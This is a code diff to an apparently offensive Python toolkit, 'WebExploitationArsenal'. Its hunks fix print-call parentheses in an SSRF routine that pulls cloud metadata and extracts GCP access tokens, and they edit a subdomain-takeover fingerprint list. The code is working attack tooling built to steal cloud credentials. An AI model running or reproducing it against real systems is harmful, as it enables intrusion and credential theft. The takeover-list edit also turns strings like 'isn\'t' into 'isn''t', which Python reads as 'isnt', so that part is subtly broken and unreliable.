@@ -1052,7 +1052,7 @@ class WebExploitationArsenal:
                             if any(indicator.lower() in response_text for indicator in indicators):
                                 extracted_data = cloud_type
                                 
-                                print(Colors.critical(f"\n      [🔥 SSRF SUCCESS] {endpoint}?{param}= → {description}")
+                                print(Colors.critical(f"\n      [🔥 SSRF SUCCESS] {endpoint}?{param}= → {description}"))
                                 print(Colors.critical(f"      [💀 EXTRACTED] {cloud_type.upper()} metadata:"))
                                 print(Colors.success(f"        {r.text[:300]}..."))
                                 
@@ -1084,7 +1084,7 @@ class WebExploitationArsenal:
                                     token = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text)
                                     if token:
                                         credentials_found['GCP_ACCESS_TOKEN'] = token.group(1)[:50] + '...'
-                                        print(Colors.critical(f"      [💀💀💀 GCP TOKEN EXTRACTED]: {token.group(1)[:50]}...")
+                                        print(Colors.critical(f"      [💀💀💀 GCP TOKEN EXTRACTED]: {token.group(1)[:50]}..."))
                                 
                                 vulns.append(Vulnerability(
                                     type="SSRF_CLOUD_METADATA_LEAKED",
@@ -1892,11 +1892,11 @@ class ReconnaissanceEngine:
                     
                     # Takeover fingerprints
                     takeover_patterns = [
-                        ('github', ['There isn\\'t a GitHub Pages site here', 'For root URLs']),
-                        ('heroku', ['No such app', 'There\\'s nothing here']),
+                        ('github', ['There isn''t a GitHub Pages site here', 'For root URLs']),
+                        ('heroku', ['No such app', 'There''s nothing here']),
                         ('s3', ['NoSuchBucket', 'The specified bucket does not exist']),
                         ('shopify', ['Sorry, this shop is currently unavailable']),
-                        ('tumblr', ['There\\'s nothing here', 'Whatever you were looking for doesn\\'t']),
+                        ('tumblr', ['There''s nothing here', 'Whatever you were looking for doesn''t']),
                         ('wordpress', ['Do you want to register']),
                         ('ghost', ['The thing you were looking for is no longer here']),
                         ('azure', ['404 Web Site not found', 'azure']),
